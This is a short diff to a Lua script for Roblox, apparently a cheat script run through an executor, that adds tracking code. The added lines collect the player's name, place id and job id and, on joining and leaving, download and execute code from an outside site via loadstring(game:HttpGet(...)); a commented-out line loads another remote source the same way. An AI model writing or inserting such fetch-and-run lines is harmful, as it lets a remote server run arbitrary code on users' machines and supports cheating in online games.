@@ -1,6 +1,24 @@
 if syn then
 -- offline until further testing loadstring(game:HttpGet('https://raw.githubusercontent.com/mrhackerman35297/AgentCC/main/Sources/GlobalChat'))()
 end
+local name = game.Players.LocalPlayer.Name
+local placeid = game.PlaceId
+local jobid = game.JobId
+
+local Players = game:GetService("Players")
+Players.PlayerRemoving:Connect(function(v)
+if game.Players.LocalPlayer.Name == v.Name then
+pcall(function()
+loadstring(game:HttpGet("https://9kdestroyer.xyz/PHP_Servers/OnlinePlayer.php?status=offline"))()
+end)
+end
+end)
+
+pcall(function()
+loadstring(game:HttpGet("https://9kdestroyer.xyz/PHP_Servers/OnlinePlayer.php?status=online"))()
+end)
+
+
 function AntiCheat()
   wait(1)
   local me        = game.Players.LocalPlayer
